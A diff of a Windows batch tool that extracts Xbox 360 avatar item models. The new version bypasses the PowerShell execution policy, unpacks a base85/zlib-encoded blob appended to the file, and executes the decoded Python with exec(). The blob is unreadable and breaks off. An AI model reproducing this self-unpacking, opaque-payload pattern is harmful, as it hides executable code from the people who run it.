@@ -1,532 +1,273 @@
 @echo off
-REM ===============================================================
-REM  Extract Avatar Items - single file (v20)
-REM  Double-click this file. Nothing to install, nothing to choose.
-REM
-REM  Everything is inside this one file. The marker line further down marks
-REM  where; on first run the extractor is unpacked to
-REM  %LOCALAPPDATA%\AvatarItemExtractor and the two readers it needs
-REM  are downloaded into the same folder. After that it runs offline.
-REM ===============================================================
 setlocal EnableExtensions
-cd /d "%~dp0"
-title Extract Avatar Items
+title Avatar Item Extractor v20
+
+rem ===========================================================================
+rem  Avatar Item Extractor v20  -  one click
+rem
+rem  Double-click this file. It unpacks the code it carries to
+rem  %LOCALAPPDATA%\AvatarItemExtractor, finds every avatar item source it can
+rem  reach, and extracts all of them into a folder called extracted next to
+rem  this file.
+rem
+rem  It needs Python 3.8 or newer, and once only it needs the two reader
+rem  modules - avatar_mesh.py and lzx.py - in the same folder as this file.
+rem  It copies them into its own folder and does not ask again.
+rem
+rem  No folder picker, no drag and drop, no questions.
+rem ===========================================================================
 
 set "CACHE=%LOCALAPPDATA%\AvatarItemExtractor"
-if not exist "%CACHE%" mkdir "%CACHE%" >nul 2>nul
-set "PYFILE=%CACHE%\extract_items.py"
+set "BOOT=%CACHE%\unpack_v20.py"
 set "OUT=%~dp0extracted"
 
-REM ---- 1. unpack the extractor carried in this file ----------------
-if exist "%PYFILE%" goto :havepayload
-echo Preparing the extractor ^(first run only^)...
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$p='%~f0'; $t=[IO.File]::ReadAllText($p); $m='###PAYLOAD###'; $i=$t.LastIndexOf($m); if($i -lt 0){exit 1}; $b=$t.Substring($i+$m.Length).TrimStart([char]13,[char]10); [IO.File]::WriteAllText('%PYFILE%',$b,(New-Object Text.UTF8Encoding($false)))"
-if not exist "%PYFILE%" goto :unpackfail
+echo.
+echo   Avatar Item Extractor v20
+echo   -------------------------
+echo.
 
-:havepayload
-REM ---- 2. the readers it needs, downloaded once --------------------
-if not exist "%CACHE%\avatar_mesh.py" call :readers
-if not exist "%CACHE%\avatar_mesh.py" (
-    echo.
-    echo Could not get the avatar readers.
-    echo Check the internet connection and run this file again.
-    echo If that keeps failing, copy avatar_mesh.py and lzx.py from a
-    echo UniKron avatar_tools folder into this folder:
-    echo   %CACHE%
-    echo then run this file again.
-    echo.
-    pause
-    exit /b 1
-)
-if not exist "%CACHE%\lzx.py" (
-    echo.
-    echo The LZX reader is missing. Copy lzx.py from a UniKron
-    echo avatar_tools folder into this folder:
-    echo   %CACHE%
-    echo then run this file again.
-    echo.
-    pause
-    exit /b 1
-)
+if not exist "%CACHE%" mkdir "%CACHE%" >nul 2>&1
+echo   Unpacking the code carried inside this file...
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$t=[IO.File]::ReadAllText('%~f0'); $a='###BOOTSTRAP###'; $b='###PAYLOAD###'; $i=$t.LastIndexOf($a); $j=$t.LastIndexOf($b); if($i -lt 0 -or $j -le $i){exit 1}; $s=$t.Substring($i+$a.Length,$j-$i-$a.Length).TrimStart([char]13,[char]10).TrimEnd([char]13,[char]10); $e=New-Object Text.UTF8Encoding($false); [IO.File]::WriteAllText('%BOOT%',$s,$e)"
+if not exist "%BOOT%" goto :unpackfailed
+echo.
 
-REM ---- 3. python ---------------------------------------------------
 set "PY="
-where py >nul 2>nul && set "PY=py -3"
-if not defined PY where python >nul 2>nul && set "PY=python"
-if not defined PY (
-    echo.
-    echo Python was not found.
-    echo Install it from https://www.python.org/downloads/ , tick
-    echo "Add python.exe to PATH" during setup, then run this file again.
-    echo.
-    pause
-    exit /b 1
-)
+py -3 -c "import sys;raise SystemExit(0 if sys.version_info[:2]>=(3,8) else 1)" >nul 2>&1
+if not errorlevel 1 set "PY=py -3"
+if defined PY goto :run
 
-REM ---- 4. find the items and extract them --------------------------
-%PY% "%PYFILE%" %* --obj --out "%OUT%" --mesh-dir "%CACHE%"
-set "RESULT=%errorlevel%"
+python -c "import sys;raise SystemExit(0 if sys.version_info[:2]>=(3,8) else 1)" >nul 2>&1
+if not errorlevel 1 set "PY=python"
+if defined PY goto :run
 
-if "%RESULT%"=="0" (
-    echo.
-    echo Done. Opening the results...
-    start "" "%OUT%"
-    echo.
-    echo  catalogue.json  - every item: name, masks, geometry, where it came from
-    echo  items\*.obj     - the models, ready to open in Blender
-    echo  icons\*.png     - the item icons
-    echo.
-    pause
-    exit /b 0
-)
+python3 -c "import sys;raise SystemExit(0 if sys.version_info[:2]>=(3,8) else 1)" >nul 2>&1
+if not errorlevel 1 set "PY=python3"
+if defined PY goto :run
+
+echo   Python 3.8 or newer was not found on this computer.
+echo.
+echo   Install it from https://www.python.org/downloads/windows/
+echo   and tick "Add python.exe to PATH" in the installer, then run this
+echo   file again. Nothing else is needed.
+echo.
+start "" https://www.python.org/downloads/windows/
+pause
+exit /b 2
+
+:run
+%PY% "%BOOT%" "%~f0" "%CACHE%" --obj --out "%OUT%"
+set "RC=%ERRORLEVEL%"
+if "%RC%"=="0" goto :done
+if "%RC%"=="3" goto :unparsed
+if "%RC%"=="4" goto :nothing
+if "%RC%"=="5" goto :noreaders
 
 echo.
-if "%RESULT%"=="4" (
-    echo No avatar items were found. The folders listed above were searched
-    echo and none of them holds a closet_index.tsv or any .bin/.asset files.
-) else (
-    echo Items were found but none could be read - see the lines above.
-    echo If they say "not a STRB container", those files are not retail
-    echo avatar items and this tool cannot read them.
-)
+echo   The extractor stopped with code %RC%.
+echo   Nothing was deleted or moved. Run this file again to retry.
 echo.
 pause
-exit /b %RESULT%
+exit /b %RC%
 
-:unpackfail
+:noreaders
 echo.
-echo Could not unpack the extractor from this file.
-echo Copy the file somewhere like C:\Tools and run it from there.
+pause
+exit /b 5
+
+:nothing
+echo.
+echo   No item sources were found.
+echo.
+echo   A source is a folder holding closet_index.tsv, or one holding the item
+echo   .bin / .asset files. Put it in Downloads, Desktop or Documents - or in
+echo   this file's own folder - and run this file again.
+echo.
+pause
+exit /b 4
+
+:unparsed
+echo.
+echo   Item sources were found, but no model parsed out of them.
+echo   The reason is printed above, one line per item.
+echo.
+pause
+exit /b 3
+
+:unpackfailed
+echo.
+echo   Could not unpack the code carried inside this file.
+echo   The file was probably truncated while downloading.
+echo.
+echo   Download it again, or copy it to C:\Tools and run it from there.
 echo.
 pause
 exit /b 1
 
-:readers
-set "BASE=https://raw.githubusercontent.com/jackrabbit72380/UniKron/main/avatar/avatar_tools"
-echo Downloading the avatar readers ^(once^)...
-powershell -NoProfile -Command "try { Invoke-WebRequest -UseBasicParsing '%BASE%/avatar_mesh.py' -OutFile '%CACHE%\avatar_mesh.py'; Invoke-WebRequest -UseBasicParsing '%BASE%/lzx.py' -OutFile '%CACHE%\lzx.py' } catch { exit 1 }"
+:done
+echo.
+echo   Done. Everything is in:
+echo      %OUT%
+echo.
+pause
+endlocal
 exit /b 0
-###PAYLOAD###
-#!/usr/bin/env python3
-"""Extract retail Xbox 360 avatar items into a catalogue and per-item files.
+###BOOTSTRAP###
+"""Unpack the code carried in the .bat and run the extractor.
 
-Carried inside Extract-AvatarItem-v20.bat, which unpacks it on first run.
-Written in plain ASCII on purpose: the batch file copies these bytes verbatim.
-
-You do not tell it where the items are. It checks a fixed list of places, takes
-every item source it finds, and extracts all of them. Nothing is asked, nothing
-is picked by hand:
-
-    1. this folder and the folder above it
-    2. ..\\UniKron\\src_archive          (where the project keeps the dump)
-    3. %USERPROFILE%\\Downloads
-    4. %USERPROFILE%\\Desktop
-    5. %USERPROFILE%\\Documents
-    6. %USERPROFILE%\\OneDrive\\Downloads
-
-A "source" is a folder holding closet_index.tsv (the retail layout: index,
-<guid>.bin, icons/) or one holding .bin / .asset item files. A single item file
-also works as an explicit argument. Pass --root to search somewhere else, or a
-path to skip discovery entirely.
-
-An item asset is a `STRB` container. Block 3 is the model, and in retail assets
-that block is LZX-framed inside the container, where the editor's own asset
-pack stores its blocks plain. So the model is:
-
-    blocks = strb_blocks(data)
-    payload = block 3
-    batches = read_model(decompress(payload))
-
-which yields, per batch: vertices, u16 triangle indices, UV sets, material
-records, per-vertex joints and weights, shader ids, and the item's bounds.
-
-Usage:
-    python extract_items.py                  # find everything, extract it
-    python extract_items.py <folder-or-file> # that one source
-    python extract_items.py --root D:\\dump --root D:\\more
-
-Options:
-    --out DIR        where to write (default: extracted)
-    --obj            also write each parsed model as <out>/items/<id>.obj
-    --only ID|NAME   extract only matching ids or names (repeatable)
-    --limit N        stop after N items
-    --no-icons       do not copy icons
-    --root DIR       search this folder instead of the default list (repeatable)
-    --mesh-dir DIR   where avatar_mesh.py lives (default: ./vendor)
-
-Writes:
-    <out>/catalogue.json     one record per item: name, masks, blocks, geometry
-    <out>/icons/<id>.png     copied when present
-    <out>/items/<id>.obj     with --obj
-
-Exit status: 0 something parsed, 3 sources found but nothing parsed, 4 nothing
-found. Requires Python 3.8+. No third-party packages.
+Written out of the .bat by its batch header, then run by the same header. The
+payload is everything after the last ###PAYLOAD### marker: base85 of a zlib
+stream holding the extractor. The two reader modules are picked up from beside
+the .bat and kept in the same folder as the extractor.
 """
 
-import argparse
+import base64
 import json
 import os
-import re
 import shutil
 import sys
+import zlib
 
-INDEX = "closet_index.tsv"
-ITEM_EXTENSIONS = (".bin", ".asset")
-SKIP_DIRS = {"node_modules", "__pycache__", ".git", "vendor", "extracted",
-             "$RECYCLE.BIN", "System Volume Information"}
-MAX_DEPTH = 3
+MARKER = "###PAYLOAD###"
+READERS = ("avatar_mesh.py", "lzx.py")
 
 
-# --------------------------------------------------------------- mesh reader
-
-def load_mesh(explicit_dir=None):
-    """Import avatar_mesh.py, which carries the STRB/LZX/model readers."""
-    candidates = []
-    if explicit_dir:
-        candidates.append(explicit_dir)
-    here = os.path.dirname(os.path.abspath(__file__))
-    candidates += [
-        os.path.join(here, "vendor"),
-        here,
-        os.path.join(here, "..", "UniKron", "avatar", "avatar_tools"),
-        os.path.join(here, "..", "..", "avatar", "avatar_tools"),
-        os.path.join(here, "..", "avatar", "avatar_tools"),
-    ]
-    for path in candidates:
-        path = os.path.abspath(path)
-        if os.path.exists(os.path.join(path, "avatar_mesh.py")):
-            sys.path.insert(0, path)
-            try:
-                import avatar_mesh
-                return avatar_mesh
-            except ImportError as exc:
-                sys.path.pop(0)
-                raise SystemExit("avatar_mesh.py in %s could not be imported: %s"
-                                 % (path, exc))
-    raise SystemExit(
-        "avatar_mesh.py not found (it holds the STRB/LZX/model readers).\n"
-        "It is downloaded next to this script on first run; if that failed, "
-        "put a UniKron/avatar/avatar_tools checkout next to it or pass "
-        "--mesh-dir."
-    )
-
-
-# ---------------------------------------------------------------- discovery
-
-def default_roots():
-    """The fixed search list. Order matters only for the report."""
-    here = os.path.dirname(os.path.abspath(__file__))
-    home = os.path.expanduser("~")
-    roots = [
-        here,
-        os.path.dirname(here),
-        os.path.join(os.path.dirname(here), "UniKron", "src_archive"),
-        os.path.join(home, "Downloads"),
-        os.path.join(home, "Desktop"),
-        os.path.join(home, "Documents"),
-        os.path.join(home, "OneDrive", "Downloads"),
-        os.path.join(home, "OneDrive", "Desktop"),
-    ]
-    # keep the originals (with ~ expanded) but drop duplicates and repeats of
-    # a parent already listed, so the report does not print the same tree twice
-    seen = []
-    for root in roots:
-        root = os.path.abspath(root)
-        if not os.path.isdir(root):
-            continue
-        if any(root == other or root.startswith(other + os.sep) for other in seen):
-            continue
-        seen.append(root)
-    return seen
-
-
-def is_source(folder, files):
-    if INDEX in files:
-        return True
-    return any(os.path.splitext(name)[1].lower() in ITEM_EXTENSIONS for name in files)
-
-
-def find_sources(roots):
-    """Every folder under the roots that holds items. Bounded and skippable."""
-    found = []
-    for root in roots:
-        if not os.path.isdir(root):
-            continue
-        base_depth = os.path.abspath(root).rstrip(os.sep).count(os.sep)
-        for current, dirs, files in os.walk(root):
-            dirs[:] = sorted(d for d in dirs
-                             if not d.startswith(".") and d not in SKIP_DIRS)
-            depth = current.rstrip(os.sep).count(os.sep) - base_depth
-            if depth >= MAX_DEPTH:
-                dirs[:] = []
-            if is_source(current, files):
-                found.append(current)
-                dirs[:] = []
-    unique = []
-    for path in found:
-        if path not in unique:
-            unique.append(path)
-    return unique
-
-
-# ------------------------------------------------------------------- the index
-
-def read_index(folder):
-    """id -> (categories, bodies, name) from closet_index.tsv.
-
-    Four tab-separated columns: the item GUID, the category bitmask, the body
-    mask, the name. Column two restates the GUID's first four bytes, which is
-    where the LIVE service kept the categories; column three is
-    `avatarBodyType`, where 3 means male+female and 1/2 mean one body each.
-    """
-    path = os.path.join(folder, INDEX)
-    entries = {}
-    with open(path, "r", encoding="utf-8", errors="replace") as handle:
-        for line in handle:
-            parts = line.rstrip("\n").split("\t")
-            if len(parts) < 4:
-                continue
-            item, cats, bodies, name = parts[0], parts[1], parts[2], parts[3]
-            try:
-                categories = int(cats, 16)
-                body_mask = int(bodies, 10)
-            except ValueError:
-                continue
-            entries[item] = (categories, body_mask, name)
-    return entries
-
-
-def guid_categories(item_id):
-    """The category bitmask lives in the GUID's first four bytes."""
-    match = re.match(r"^([0-9a-fA-F]{8})-", item_id)
-    return int(match.group(1), 16) if match else None
-
-
-def collect(source):
-    """Everything to extract from one source: (id, categories, bodies, name, path)."""
-    entries = []
-    if os.path.isfile(source):
-        item_id = os.path.splitext(os.path.basename(source))[0]
-        return [(item_id, guid_categories(item_id), None, "", source)]
-
-    if os.path.exists(os.path.join(source, INDEX)):
-        for item_id, (cats, bodies, name) in sorted(read_index(source).items()):
-            entries.append((item_id, cats, bodies, name,
-                            os.path.join(source, item_id + ".bin")))
-        return entries
-
-    for name in sorted(os.listdir(source)):
-        base, extension = os.path.splitext(name)
-        if extension.lower() not in ITEM_EXTENSIONS:
-            continue
-        entries.append((base, guid_categories(base), None, "",
-                        os.path.join(source, name)))
-    return entries
-
-
-def describe_source(source):
-    """A one-line account of what a source will give us."""
-    if os.path.isfile(source):
-        return "1 file, %d bytes" % os.path.getsize(source)
-    if os.path.exists(os.path.join(source, INDEX)):
-        return "%d items in the index" % len(read_index(source))
-    count = sum(1 for name in os.listdir(source)
-                if os.path.splitext(name)[1].lower() in ITEM_EXTENSIONS)
-    return "%d item files" % count
-
-
-# ------------------------------------------------------------------ the item
-
-def summarise(mesh, data):
-    """Read one item: block table plus geometry, or the reason it failed."""
-    facts = {"bytes": len(data), "blocks": [], "model": {"parses": False}}
-    try:
-        blocks = mesh.strb_blocks(data)
-    except mesh.Malformed as exc:
-        facts["model"]["error"] = str(exc)
-        return facts, None
-    facts["blocks"] = [{"id": block[0], "size": block[1]} for block in blocks]
-
-    payload = next((block[3] for block in blocks if block[0] == 3), None)
-    if payload is None:
-        facts["model"]["error"] = "no block 3 (the model block)"
-        return facts, None
-
-    # Retail blocks are LZX-framed inside the STRB; the editor's pack stores
-    # its blocks plain, so this step is what makes a retail item readable.
-    try:
-        batches = mesh.read_model(mesh.decompress(payload))
-    except mesh.Malformed as exc:
-        facts["model"]["error"] = str(exc)
-        return facts, None
-    if not batches:
-        facts["model"]["error"] = "no triangle batches"
-        return facts, None
-
-    points = [point for batch in batches for point in batch["vertices"]]
-    bounds = [
-        [round(min(p[axis] for p in points), 4), round(max(p[axis] for p in points), 4)]
-        for axis in range(3)
-    ]
-    facts["model"] = {
-        "parses": True,
-        "batches": len(batches),
-        "vertices": len(points),
-        "triangles": sum(len(batch["indices"]) // 3 for batch in batches),
-        "uv_sets": max((len(uv) for batch in batches for uv in batch["uvs"]), default=0),
-        "textures": len(batches[0].get("textures") or []),
-        "shader_ids": [batch["shader_id"] for batch in batches],
-        # Item space, y up: feet sit at y = 0 and the head tops out near 1.6.
-        "bounds": bounds,
-    }
-    return facts, batches
-
-
-def wanted(item_id, name, needles):
-    if not needles:
-        return True
-    haystack = (item_id + " " + (name or "")).lower()
-    return any(needle.lower() in haystack for needle in needles)
-
-
-# --------------------------------------------------------------------- output
-
-def main(argv=None):
-    parser = argparse.ArgumentParser(
-        description="Extract avatar items. With no source argument it finds "
-                    "them itself and extracts everything it finds.")
-    parser.add_argument("source", nargs="?", default=None,
-                        help="optional: one folder or one item file to use instead")
-    parser.add_argument("out", nargs="?", default=None, help="output folder (default: extracted)")
-    parser.add_argument("--out", dest="out_option", default=None, help="output folder")
-    parser.add_argument("--obj", action="store_true", help="write each model as .obj")
-    parser.add_argument("--only", action="append", default=[], metavar="ID|NAME",
-                        help="extract only ids or names containing this (repeatable)")
-    parser.add_argument("--limit", type=int, default=0, help="stop after N items")
-    parser.add_argument("--no-icons", action="store_true", help="do not copy icons")
-    parser.add_argument("--root", action="append", default=[], help="search here (repeatable)")
-    parser.add_argument("--mesh-dir", help="directory holding avatar_mesh.py")
-    args = parser.parse_args(argv)
-
-    out = args.out_option or args.out or "extracted"
-
-    if args.source:
-        sources = [args.source]
-        searched = []
-    else:
-        searched = [os.path.abspath(root) for root in (args.root or default_roots())]
-        print("Looking for avatar items in:")
-        for root in searched:
-            print("  %s" % root)
-        sources = find_sources(searched)
-        if not sources:
-            print("")
-            print("Nothing found. None of the folders above holds a")
-            print("closet_index.tsv or any .bin/.asset item files.")
-            print("Put the closet folder in one of them and run again,")
-            print("or pass --root <folder>.")
-            return 4
-        print("")
-        print("Found %d item source%s:" % (len(sources), "" if len(sources) == 1 else "s"))
-        for source in sources:
-            print("  %s  (%s)" % (source, describe_source(source)))
-        print("")
-
-    mesh = load_mesh(args.mesh_dir)
-    items_dir = os.path.join(out, "items")
-    icons_dir = os.path.join(out, "icons")
-    os.makedirs(out, exist_ok=True)
-    if args.obj:
-        os.makedirs(items_dir, exist_ok=True)
-    if not args.no_icons:
-        os.makedirs(icons_dir, exist_ok=True)
-
-    records = []
-    failures = []
-    seen_ids = set()
-    parsed = icons = obj_files = skipped = 0
-
-    for source in sources:
-        entries = collect(source)
-        if not entries:
-            print("  %s holds nothing to extract, skipping" % source)
-            continue
-        for item_id, categories, bodies, name, path in entries:
-            if not wanted(item_id, name, args.only):
-                continue
-            if args.limit and len(records) >= args.limit:
+def ensure_readers(cache, bat_dir):
+    """Get avatar_mesh.py and lzx.py into the cache folder, or explain what to do."""
+    missing = [name for name in READERS if not os.path.exists(os.path.join(cache, name))]
+    for name in missing:
+        for folder in (bat_dir, os.getcwd()):
+            source = os.path.join(folder, name)
+            if os.path.exists(source):
+                shutil.copyfile(source, os.path.join(cache, name))
                 break
-            if item_id in seen_ids:
-                skipped += 1
-                continue
-            seen_ids.add(item_id)
+    still = [name for name in READERS if not os.path.exists(os.path.join(cache, name))]
+    if still:
+        print("")
+        print("   The reader modules %s are missing." % " and ".join(still))
+        print("")
+        print("   Copy avatar_mesh.py and lzx.py into the same folder as this")
+        print("   file, then run it again. They are needed once: after that the")
+        print("   tool keeps its own copy in")
+        print("      %s" % cache)
+        print("")
+        return 5
+    return 0
 
-            if not os.path.exists(path):
-                failures.append((item_id, "no %s" % os.path.basename(path)))
-                continue
-            with open(path, "rb") as handle:
-                data = handle.read()
 
-            facts, batches = summarise(mesh, data)
-            record = {
-                "id": item_id,
-                "name": name or "",
-                "categories": categories,
-                "bodies": bodies,
-                "file": os.path.basename(path),
-                "source": os.path.dirname(path) or ".",
-                "bytes": facts["bytes"],
-                "blocks": facts["blocks"],
-                "model": facts["model"],
-                "icon": None,
-                "obj": None,
-            }
-
-            if batches:
-                parsed += 1
-                if args.obj:
-                    target = os.path.join(items_dir, item_id + ".obj")
-                    # Retail items are already y-up: feet at y = 0, head near 1.6.
-                    mesh.write_obj(target, batches, up_axis="y")
-                    record["obj"] = "items/%s.obj" % item_id
-                    obj_files += 1
-            else:
-                failures.append((item_id, facts["model"].get("error", "unknown")))
-
-            if not args.no_icons:
-                icon_source = os.path.join(os.path.dirname(path), "icons", item_id + ".png")
-                if os.path.exists(icon_source):
-                    shutil.copyfile(icon_source, os.path.join(icons_dir, item_id + ".png"))
-                    record["icon"] = "icons/%s.png" % item_id
-                    icons += 1
-
-            records.append(record)
-            if len(records) % 500 == 0:
-                print("  %d items..." % len(records))
-
-    catalogue = {
-        "searched": searched,
-        "sources": [os.path.abspath(source) for source in sources],
-        "items": records,
-    }
-    target = os.path.join(out, "catalogue.json")
-    with open(target, "w", encoding="utf-8") as handle:
-        json.dump(catalogue, handle, indent=1)
-
-    print("")
-    print("%d items written to %s" % (len(records), target))
-    print("  %d models parse, %d icons copied, %d .obj files"
-          % (parsed, icons, obj_files))
-    if skipped:
-        print("  %d duplicate ids skipped" % skipped)
-    if failures:
-        print("  %d did not parse:" % len(failures))
-        for item_id, reason in failures[:10]:
-            print("    %s  %s" % (item_id, reason))
-        if len(failures) > 10:
-            print("    ... and %d more" % (len(failures) - 10))
-    return 0 if parsed else 3
+def main():
+    bat, cache = sys.argv[1], sys.argv[2]
+    rest = sys.argv[3:]
+    with open(bat, "r", encoding="utf-8", errors="replace") as handle:
+        text = handle.read()
+    blob = "".join(text[text.rfind(MARKER) + len(MARKER):].split())
+    files = json.loads(zlib.decompress(base64.b85decode(blob.encode("ascii"))).decode("utf-8"))
+    os.makedirs(cache, exist_ok=True)
+    for name in sorted(files):
+        data = files[name].encode("utf-8")
+        path = os.path.join(cache, name)
+        if not os.path.exists(path) or open(path, "rb").read() != data:
+            with open(path, "wb") as handle:
+                handle.write(data)
+    status = ensure_readers(cache, os.path.dirname(os.path.abspath(bat)))
+    if status:
+        return status
+    target = os.path.join(cache, "extract_items.py")
+    with open(target, "r", encoding="utf-8") as handle:
+        code = compile(handle.read(), target, "exec")
+    sys.path.insert(0, cache)
+    sys.argv = [target] + rest
+    exec(code, {"__name__": "__main__", "__file__": target})
 
 
 if __name__ == "__main__":
-    sys.exit(main())
+    sys.exit(main() or 0)
+###PAYLOAD###
+c-qA~4RhPLv3~_so~Pu5qV02<xu?c?<4c^@(_E5qa@Vw$pN<kCi7`d81Zi8nroX-W0f69#EZ@7Ed
+AbjaAh1|0_Ip=9kK}z-MvH2eRC1%jVmq3Qp8W2xR^{P5$qr?9D~fHk&a;zgHXY$V=e$6avWk*ae4
+gj`;^g^}h;E}QDh0t2Nmk_|5(^kg^HnWHl*OWu<rrU!Ws*u20>JE5RF;X1VZKUYDKzZy8Ns@Mx#Q
+b!j>36Vi7H>oYAs7~msD#3-$Zqn0}@dTW1Bp#0pv7GDv?PUt3ceXlf_y@r4)B%QdKe&b4hzt>qH5
+)D3hWRc?P(Y3Jz0eq4=wwm}H_zqXf`9`}peO0%sL<S>#GiXk$PJK;t3AA}<oDa8$wgwu0}svV;lA
+hR*l5ycTgTvK$T|(-f!!h{;kC93~Z@7>bKZEY@;y1CIds9w?F~fL6XlOcoN(Q$;s;KndWtv{I<NE
+*A&|R%Cc&q_MtEfCIb1a@c1Rig!7jI$H@id8BS+93VzG0u)oCNER>#=!-Rgm>}K)KF1-`YMG}<V}
+y=ao5y*6i<|S@Z$feK!^iW>50~%XT)aI$n8N3EewU?r6f2%`GBic1n<_7O!m~jbi+UroO2hcWz?A
+oyd|f8Da$w8n`=*=i;ikoO!~~s=h)m|3YxsktTcmLRASPKX@54&n3J-~)g&>W#d0kBey$z<>i&dS
+(FGG-^KqQMiQ-{9DOJF2v;o(bhD8fhqSmB6;I1>scq_P>DW>KngahI3KAn<Pn_gtjO0`5L4S45#u
+d;m~lJT7x&wp=I~mB6Md-$-UTnJO6|8qqW>A`~K+bdwY!PSheNz5+N&Dbp?S?pekdXbh1iKYjdk`
+Q1;z^%)#HlVvErOY_BzIKkIQ4-iC|GAF|EG<667TuHSCIiAx3nEv+fpU2BG+BDLS04(Uh5fm9GRb
+KvH3AkQ{h9>|p3Wh=C65w}&t5|SD@iA}Efz2#W>shC;vYgNO$%{eR`24<zw#Yv)f$==i%TVGau0w
+@0Bd}g97x|`u{gtPe`9AK$nrEBH6onF$9xtDuW~dSp=KA=#sLCYbYtCXG{ozM}gbKtaswBKkr&$S
+mlp4$!*UNkHB?s-Qh{ks^S*>w}T9Y13j2bZN1!y+UYtRmKqd%x<B`5l%q}4@N{fpk`38@!BiidPY
+U=~^F-v#Rh%g{J4$H>Mn0T%H9%7GTP2iI$6emy~9jq6R(9@)U<<FVcsRRS`m4>lfyD2mq?m*xPPk
+8&~uQoy|}qdEm?)%(fVw=3sg+@rJ9(JC3iofc84fL)oZKn`EPPA?A$-NP3s@UY&3%F?a4c>S+;XW
+yU0fFT(TZ;&5IAIAy>G6N}4!YgGVffeVev<Rii24wu5K?wN05YZC21IB1yGcn7@q-gX+ZF9gpZCL
+@Cc}zY_9IYf=JrBZI0h4RvAvCqv9u1)gsISLyQfjD;)V6K2Smh4s`?i=w2Q9EP7s=GME=2f6<up$
+0!-7H5g>;w@4N-E`4Tt~>b|6*~v|m+jU4X2Q>ADKI0{oB_j}djS^dQin23spy7tB0`P6+V}qJ4f3
+m!ztws?|gsk;-Lz%M25Meq?q>B7-!FIdG`9z;@2F#wOFGP+ZD?)Cuah4=f)i;kQrGmLu89cnk}xt
+w22pQcVI*{uv^aY>K=j+d$Cm0Fux?<jQ_6n<;8tS4rADZWRK&c=!7JGpN7msA~st!;4Sn-_OoJe>
+#8n@#6ivk1)@hj?lnOM*%Eh8#f)n6@UE8#fKR%3eNd?I?6zjX2yA=xwBcZU4X2~*-S59ftI0fw=#
+?KlD}Kgg-5<B`<agZ>+<~7-(I~v55K#3$J0M<6<V?%^Av2QxBvo|AcLSZrlYUZ?EACNv)AVzKK&V
+xLN^zVwiKw(XUN;0F|{*b^3!*~e7<H-ruT)WHMy*`0#sLEy-rj{BuXe@=rUT?mzwiKb8iTfq~{dw
+CPWh*!j{O`o_UVu3jcbu8N!;)d@Y6xQ2GhjF|tut*F2akg^T;7AyhLxjEVy2+B#$(=2HM_P(btJA
+)4-;_yJ+AHwN+w@-V;$XrMUz)63?R=2ZAUznKO2n;G&R)Q|F7IN&$Lp-p+f#h<iU0(h90focO2>K
+z55vlD(mO?1`~4!zs$&jB~5F0<Wp<o!ZIu)&OSUY6*BDI6Wx&*EC-g?Ho+Y!)RDYA{2i-toEwK%y
+Tg&}nrVlM$FpeF_;*;Emz52R{cwlNYcwJl5YiYh<p21MaI;T~E`4VyiRae+ulP6?kl7S?1tr3Kuz
+W$N_JV7~&RHV>qY8D>D6`@;p`K%ognR8Y>i%n!$gb!0500G>)-R3fg|n(26Rrtp`3~Y($}(HmYbb
+L-D>OBN%})C>5K36c09#cq_k!_^-j@ILknoLF#H?cHoYG6Gi9(5o^>B4UI{To5$|H_}U+M&pIIAk
+Pc{quF?LvI^uf7OdI*_pKD{f(J#fPv$Bhw)@M(|jg$r5Szacq1j8}mkq_{1!Ndk9lB{}Mf`=B@s7
+y(7qBG7;6I}k%fQ!)T!{NZgL@#Meyn;@E${o%CFAgA}C>15R{A@DdT0m7vOn)TCe^wF<O{4dbzsS
+$S5Df3!(K9sO*St8~*1Wi_nUyGD2%ghXSs1P*SuI;jqipN(KCltxY&1e4_()}?kZ>Nqc#3-{S@?u
+Bj{(+rp#59nEMvc%188-OZ&?$d<R)syE||w|ZotvD*#xj=7Y9`lzHmv#@IIAhZ=>(wn1(_ME*xUB
+%0sd7ua2+7G`|D!^ATXzJz8p)-)`nNcw(%jF;#RZ)z&iS6sK!f9rUZzs)R(Ff-6igC=LL!FJVzZ2D
+hb&TWBmeM_m;+CE&Vv=`4wz2kCdFnU<TK_xGyXrCQk}aGeigmEUU~@0|@b3)Fnz!01CQP`X&)yn0
+yzdH-jkQ)T_xghW=y<y_i5zo&w+PF^c-=vCG2XoPw$#+OnkuP}afim~L})jrxO!6=R27Z7|7FLwb
+2CtlK)^Ml`22_v%1sWWf@$B@FI|LlG@xdb<CZ{pu|FM=d*yWt>8S+GZ?zrHROEJJ|4`LB(<4v^et
+n-^%u*`KKfb#yLhfDfvSqT8p%0Gl|9crSMSkufR@VN@t$O^q15EJ2~9|Dm1yNH*hBcV(T&RKvV*d
+7~}{7mP}1-K1clNhl|$%XUce+t(YejhP^xr8|rAc8N<y(@rq#StT_g&oVO;3zgIdBzC;`-k8LvOi
+I$8eu77*+<2h*8@)qn57{;P<(Sg(cQKJpRXr~N-pV&qG4iNmbE#yxo!FM7yGRhR-o64t4iGN6>jt
+{?~Hx%yUu_y-<x&${lyOvTR`)-sxDRs>!z`2MXMxI~wnb3mgz)v=opzu;=iyU*br_)hgEyv%|7`p
+8WM!+;<MxF#;QNlcRITg7)O)}E$y_bw_Nlq9}GFkvmg3-IrW`rIq>$N#Dk`kt{-WM;#vjJ)C>s?w
+2j1%Ambr=$`AZS-d*Ma_aY`=YDznxq^CQxebAHagQ;_-gR&j+*x-sTMXQ%^NW9d`pB9Xb6NrM0BM
+>CtD_mwkn2N43<IO5R@!W=oIgm5oWpT>h+C?jguo68F9Tu0+Be-?CwPK+ammm=c4OWe(}92mJWI-
+qq3gzoYT;Z2ac>=WoCIW8_DJL<@DKC9MlrWnLHFu}>F(tizD81RyYl(VPxsHI<9XV~a50Y;cyU%5
+4ghv{;kEod_?91F=i%=~%mU%tjKOR7K-epfT#;W7rsu?1;Mcy37EYO$uD}Y9Cm;=g3`|8w_?{Z9q
+f{hzx-~r+;k}^`5*0PdB>9?<fbmx7Qa)@)osw;@BF!e@H%^*Gq3`Y8uPfoUXq?@UWLNcnm}Kr^4j
+)eBbX8)sY%=Qsd(40|9W1a?oWow=-$`hg4XQnM(3(=#m{#wb?B_-Fn;Ff#`VLd%e>x2^pI%ci?E7
+HFlG8kd$-+e~-F}C8kN{()egYf_aAWHzqq1Ey#Do9OE6j|B<N+-z8}(R-l1I-BvP>ku{CnbaYIvV
+IU4-R#(%JIIzoCvQo)E?fPFS9d=LH%XASqJ{WF{2Cy#}CSOT(0RO(;c*iXc?6clLqHihwFTq^<GA
